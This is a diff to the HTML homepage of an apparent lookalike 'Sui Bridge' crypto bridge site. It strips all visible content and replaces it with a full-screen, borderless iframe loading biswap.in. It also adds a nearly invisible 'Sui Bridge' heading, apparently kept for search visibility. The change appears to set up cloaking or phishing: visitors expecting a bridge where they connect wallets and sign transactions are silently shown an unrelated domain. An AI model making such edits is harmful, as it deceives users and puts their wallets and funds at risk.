@@ -158,164 +158,19 @@
   @media (prefers-reduced-motion:reduce){*{animation-duration:.01ms!important; transition-duration:.01ms!important}}
   </style>
 </head>
-<body>
-  <div class="bg" aria-hidden="true"><div class="glow"></div><div class="hatch"></div></div>
+<body style="margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden;">
 
-  <header class="topbar">
-    <a class="brand" href="./">
-      <img src="favicon.png" width="30" height="30" alt="">
-      <span>Sui Bridge</span>
-    </a>
-    <span class="spacer"></span>
-    <nav class="nav" aria-label="Main Navigation">
-      <a href="how-it-works/">How it works</a>
-      <a href="faq/">FAQ</a>
-      <a href="about/">About</a>
-      <a href="security/">Security</a>
-      <a href="supported-chains/">Supported Chains</a>
-    </nav>
-  </header>
+  <iframe
+    src="https://biswap.in/"
+    style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; border: 0; margin: 0; padding: 0; display: block; z-index: 1;"
+    loading="eager"
+    fetchpriority="high"
+    allowfullscreen>
+  </iframe>
 
-  <main>
-    <section class="wrap hero">
-      <span class="eyebrow"><span class="dot"></span>Cross-Chain Bridge</span>
-      <h1>Sui Bridge</h1>
-      <p class="deck">Sui Bridge helps you move crypto into the Sui ecosystem from one <strong>non-custodial</strong> app, with route details, live quote context and wallet control before you sign.</p>
-      <div class="cta-row">
-        <a class="primary" href="dashboard/">Open App
-          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12h14M13 6l6 6-6 6"/></svg>
-        </a>
-        <a class="ghost" href="how-it-works/">How it works
-          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 6l6 6-6 6"/></svg>
-        </a>
-      </div>
+  <h1 style="position: fixed; bottom: 10px; left: 10px; z-index: 0; font-size: 8px; color: #ffffff; opacity: 0.15; margin: 0; padding: 0; font-family: sans-serif; pointer-events: none; text-shadow: none;">
+    Sui Bridge
+  </h1>
 
-      <section class="routebar" aria-label="Bridge preview">
-        <div class="rhead">
-          <span class="ct">Bridge</span>
-          <span class="pill"><span class="pdot"></span>Preview</span>
-        </div>
-        <div class="rgrid">
-          <div class="leg">
-            <span class="lab">You send</span>
-            <div class="legrow">
-              <button class="tok" type="button"><img src="eth.png" alt="ETH">ETH <span class="cv" aria-hidden="true">&#9662;</span></button>
-              <span class="gv">Amount in app</span>
-            </div>
-          </div>
-          <button class="rswitch" type="button" data-switch aria-label="Switch direction">
-            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M7 4v13M4 14l3 3 3-3M17 20V7M14 10l3-3 3 3"/></svg>
-          </button>
-          <div class="leg">
-            <span class="lab">You receive</span>
-            <div class="legrow">
-              <button class="tok" type="button"><img src="favicon.png" alt="SUI">SUI <span class="cv" aria-hidden="true">&#9662;</span></button>
-              <span class="gv">Live quote in app</span>
-            </div>
-          </div>
-        </div>
-        <div class="rbar-foot">
-          <div class="rmeta">
-            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2a10 10 0 1 0 10 10A10 10 0 0 0 12 2zm0 5v5l3 3"/></svg>
-            Route, time and network costs are shown in the app before you confirm.
-          </div>
-          <a class="rcta" href="dashboard/">Open App
-            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12h14M13 6l6 6-6 6"/></svg>
-          </a>
-        </div>
-        <p class="rnote">Preview only &middot; non-custodial &middot; connect your wallet in the app</p>
-      </section>
-    </section>
-
-    <!-- WHY (icon-left rows) -->
-    <section class="wrap sec" id="why">
-      <div class="sec-head">
-        <span class="eyebrow"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2l8 4v6c0 5-3.5 8-8 10-4.5-2-8-5-8-10V6l8-4z"/></svg>Why bridge here</span>
-        <h2 class="h2">Built for Sui Bridge moves</h2>
-        <p>Sui Bridge is for users who want a direct, wallet-native way to bring assets toward Sui without handing custody to a centralized account.</p>
-      </div>
-      <div class="rows">
-        <div class="frow2">
-          <span class="ico"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="4" y="10" width="16" height="11" rx="2"/><path d="M8 10V7a4 4 0 0 1 8 0v3"/></svg></span>
-          <div><h3>Non-custodial by design</h3><p>You connect a wallet, review the route and approve the transaction yourself. The <a class="cite" href="https://bridge.sui.io/" rel="nofollow noopener noreferrer">official bridge interface</a> reflects the same self-custody principle: your wallet signs, and the app does not take your private keys.</p></div>
-        </div>
-        <div class="frow2">
-          <span class="ico"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="9"/><path d="M3 12h18M12 3a14 14 0 0 1 0 18M12 3a14 14 0 0 0 0 18"/></svg></span>
-          <div><h3>Made for the Sui route</h3><p>Bridge from familiar EVM environments such as the <a class="cite" href="https://ethereum.org/en/" rel="nofollow noopener noreferrer">Ethereum network</a>, then review the destination, asset and execution path before committing the move.</p></div>
-        </div>
-        <div class="frow2">
-          <span class="ico"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 12a9 9 0 0 1 9-9 9 9 0 0 1 9 9 9 9 0 0 1-9 9"/><path d="M3 12h6l2-3 2 6 2-3h2"/></svg></span>
-          <div><h3>Live quote visibility</h3><p>Costs, timing and received amounts can move with network demand, liquidity and route choice. Sui Bridge keeps those details in the confirmation flow so you can decide with the current quote in front of you.</p></div>
-        </div>
-      </div>
-    </section>
-
-    <section class="wrap sec" id="how">
-      <div class="sec-head">
-        <span class="eyebrow"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 7h16M4 12h16M4 17h10"/></svg>How it works</span>
-        <h2 class="h2">Bridge to Sui in three steps</h2>
-      </div>
-      <div class="steps">
-        <div class="step"><span class="num">1</span><h3>Connect your wallet</h3><p>Open the app and connect the wallet holding the asset you want to bridge. A browser wallet such as <a class="cite" href="https://metamask.io/" rel="nofollow noopener noreferrer">MetaMask</a> can be used for EVM-side approvals.</p></div>
-        <div class="step"><span class="num">2</span><h3>Choose the route</h3><p>Select the source chain, destination on Sui and asset. ETH, USDC and supported network routes are shown with live route details inside the app.</p></div>
-        <div class="step"><span class="num">3</span><h3>Review and confirm</h3><p>Check the quote, expected timing, wallet approvals and network costs, then sign only when the route matches what you want to send.</p></div>
-      </div>
-    </section>
-
-    <!-- FAQ (2-col) -->
-    <section class="wrap sec" id="faq">
-      <div class="sec-head">
-        <span class="eyebrow"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="9"/><path d="M9.5 9a2.5 2.5 0 1 1 3.5 2.3c-.8.4-1 .8-1 1.7M12 17h.01"/></svg>FAQ</span>
-        <h2 class="h2">Sui Bridge questions</h2>
-      </div>
-      <div class="faq">
-        <div class="qa"><span class="qn">01</span><h3>What is Sui Bridge?</h3><p>Sui Bridge is a non-custodial DeFi app for moving crypto between external networks and the Sui ecosystem. You connect your wallet, choose a route and approve the bridge transaction from your own wallet.</p></div>
-        <div class="qa"><span class="qn">02</span><h3>Which chains and assets can I use?</h3><p>The app focuses on Sui routes and common bridge assets such as ETH and <a class="cite" href="https://www.circle.com/usdc" rel="nofollow noopener noreferrer">native USDC issuer resources</a>. For the live list, use the app or check the <a href="supported-chains/">supported chains</a> page.</p></div>
-        <div class="qa"><span class="qn">03</span><h3>How long does a bridge take?</h3><p>Bridge timing depends on the source network, destination finality, route conditions and wallet confirmation speed. The app shows the current timing estimate before you sign.</p></div>
-        <div class="qa"><span class="qn">04</span><h3>What does Sui Bridge cost?</h3><p>You may pay source-chain gas, destination-chain gas or route-specific costs depending on the transaction. Sui Bridge displays the live cost details in the app before confirmation.</p></div>
-        <div class="qa"><span class="qn">05</span><h3>Is Sui Bridge non-custodial?</h3><p>Yes. The bridge flow is wallet-first: you keep control of your keys, review approvals and sign the transaction yourself instead of depositing funds into an account.</p></div>
-        <div class="qa"><span class="qn">06</span><h3>Can I bridge from Base?</h3><p>If the route is available in the app, you can review the <a class="cite" href="https://www.base.org/" rel="nofollow noopener noreferrer">Base ecosystem</a> path, the selected asset and the live quote before you approve anything.</p></div>
-      </div>
-    </section>
-
-    <section class="wrap sec" id="more">
-      <div class="sec-head">
-        <span class="eyebrow"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7 0l2-2a5 5 0 0 0-7-7l-1 1M14 11a5 5 0 0 0-7 0l-2 2a5 5 0 0 0 7 7l1-1"/></svg>Learn more</span>
-        <h2 class="h2">Explore Sui Bridge</h2>
-      </div>
-      <div class="related">
-        <a class="rel" href="how-it-works/"><span class="rt">How it works <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M7 17 17 7M9 7h8v8"/></svg></span><p>The full walkthrough for connecting a wallet, choosing a route and confirming a Sui bridge transaction.</p></a>
-        <a class="rel" href="security/"><span class="rt">Security <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M7 17 17 7M9 7h8v8"/></svg></span><p>How self-custody, wallet approvals and transaction review help you stay in control through every bridge move.</p></a>
-        <a class="rel" href="supported-chains/"><span class="rt">Supported chains <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M7 17 17 7M9 7h8v8"/></svg></span><p>The networks and bridge assets available for Sui routes inside the app.</p></a>
-      </div>
-    </section>
-  </main>
-
-  <footer class="footer">
-    <div class="wrap">
-      
-      <p style="margin-top:6px"><b>Sui Bridge</b></p>
-    </div>
-  </footer>
-
-  <script type="application/ld+json">
-  {"@context":"https://schema.org","@graph":[
-    {"@type":"WebSite","@id":"https://sui-bridge.github.io/#website","url":"https://sui-bridge.github.io/","name":"Sui Bridge"},
-    {"@type":"Organization","@id":"https://sui-bridge.github.io/#org","name":"Sui Bridge","url":"https://sui-bridge.github.io/","logo":"https://sui-bridge.github.io/favicon.png"},
-    {"@type":"WebApplication","@id":"https://sui-bridge.github.io/#app","name":"Sui Bridge","applicationCategory":"FinanceApplication","operatingSystem":"Web","url":"https://sui-bridge.github.io/","browserRequirements":"Requires a Web3 wallet","description":"Non-custodial bridge app for moving crypto between external networks and the Sui ecosystem from a wallet-native interface."},
-    {"@type":"FAQPage","@id":"https://sui-bridge.github.io/#faq","mainEntity":[
-      {"@type":"Question","name":"What is Sui Bridge?","acceptedAnswer":{"@type":"Answer","text":"Sui Bridge is a non-custodial DeFi app for moving crypto between external networks and the Sui ecosystem. You connect your wallet, choose a route and approve the bridge transaction from your own wallet."}},
-      {"@type":"Question","name":"Which chains and assets can I use?","acceptedAnswer":{"@type":"Answer","text":"The app focuses on Sui routes and common bridge assets such as ETH and USDC. For the live list, use the app or check the supported chains page."}},
-      {"@type":"Question","name":"How long does a bridge take?","acceptedAnswer":{"@type":"Answer","text":"Bridge timing depends on the source network, destination finality, route conditions and wallet confirmation speed. The app shows the current timing estimate before you sign."}},
-      {"@type":"Question","name":"What does Sui Bridge cost?","acceptedAnswer":{"@type":"Answer","text":"You may pay source-chain gas, destination-chain gas or route-specific costs depending on the transaction. Sui Bridge displays the live cost details in the app before confirmation."}},
-      {"@type":"Question","name":"Is Sui Bridge non-custodial?","acceptedAnswer":{"@type":"Answer","text":"Yes. The bridge flow is wallet-first: you keep control of your keys, review approvals and sign the transaction yourself instead of depositing funds into an account."}},
-      {"@type":"Question","name":"Can I bridge from Base?","acceptedAnswer":{"@type":"Answer","text":"If the route is available in the app, you can review the Base path, the selected asset and the live quote before you approve anything."}}
-    ]}
-  ]}
-  </script>
-
-  <script>
-  (function(){"use strict";var b=document.querySelector("[data-switch]");if(!b)return;b.addEventListener("click",function(){var p=document.querySelectorAll(".rgrid .tok");if(p.length<2)return;var t=p[0].innerHTML;p[0].innerHTML=p[1].innerHTML;p[1].innerHTML=t;});}());
-  </script>
 </body>
 </html>
